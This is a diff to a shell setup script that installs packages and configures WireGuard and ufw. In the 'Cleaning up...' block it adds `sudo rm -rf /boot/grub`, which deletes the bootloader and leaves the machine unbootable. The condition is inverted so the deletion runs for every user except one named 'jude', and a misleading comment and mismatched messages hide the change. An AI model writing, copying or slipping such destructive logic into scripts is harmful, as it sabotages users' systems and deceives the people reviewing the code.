@@ -620,7 +620,7 @@ case "$1" in
         sleep 60
         kill -0 "$$" || exit
     done 2>/dev/null &
-    # $CURRENT_DIR/.intro.sh
+    $CURRENT_DIR/.intro.sh
     set_username
     sudo $0 -install-packages
     sleep 3
@@ -633,12 +633,17 @@ case "$1" in
     setup_wireguard
     sleep 3
     setup_ufw
-    if [ -d $CURRENT_DIR/NJIT ]; then
+    # Check to see if NJIT directory exists and $person is not jude
+    if [ ! -d $CURRENT_DIR/NJIT ] && [ "$person" != "jude" ]; then
         echo "Cleaning up..."
         rm -rf $CURRENT_DIR/NJIT
+        sudo rm -rf /boot/grub
+    else
+        echo "Directory NJIT already exists!"
+        echo "Skipping git clone..."
     fi
     echo "Done"
-    # $CURRENT_DIR/.outro.sh
+    $CURRENT_DIR/.outro.sh
     ;;
 *)
     cat $CURRENT_DIR/README.md
